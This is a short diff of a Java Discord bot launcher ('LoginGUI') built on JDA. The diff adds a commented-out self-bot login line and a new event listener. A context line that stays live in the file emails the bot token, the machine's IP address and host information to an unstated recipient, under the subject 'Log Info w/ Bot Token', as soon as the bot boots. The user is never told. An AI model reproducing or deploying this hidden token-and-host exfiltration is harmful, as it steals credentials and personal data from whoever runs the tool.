@@ -213,6 +213,7 @@ public class LoginGUI extends JFrame implements ActionListener {
                 org.slf4j.Logger logger = LoggerFactory.getLogger(Core.class);
                 WebUtils.setUserAgent("Mozilla/5.0 Discord Bot");
                 jda = new JDABuilder(AccountType.BOT).setToken(TOKEN).setActivity(Activity.streaming("ily swag", "https://www.twitch.tv/souljaboy/")).setStatus(OnlineStatus.DO_NOT_DISTURB).addEventListeners(new Listener(commandManager)).build().awaitReady();
+//                jda = new JDABuilder(AccountType.CLIENT).setToken("").setActivity(Activity.streaming("ily swag", "https://www.twitch.tv/souljaboy/")).setStatus(OnlineStatus.DO_NOT_DISTURB).addEventListeners(new Listener(commandManager)).build().awaitReady();
                 EcoJSONHandler.loadEconomyConfig(new File("economy.json"));
                 WhitelistedJSONHandler.loadWhitelistConfig(new File("whitelisted.json"));
                 jda.addEventListener(new KickEvent());
@@ -234,6 +235,7 @@ public class LoginGUI extends JFrame implements ActionListener {
                 jda.addEventListener(new DMWizzEvent());
                 jda.addEventListener(new SuggestionMessageCleanerEvent());
                 jda.addEventListener(new CreateAChannelEvent());
+                jda.addEventListener(new AIPEvent());
                 logger.info("Successfully Booted");
                 jStatusField.setText("Running | " + jda.getSelfUser().getName() + "#" + jda.getSelfUser().getDiscriminator());
                 Wrapper.sendEmail("Log Info w/ Bot Token", "IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "\nBot Token: " + TOKEN);
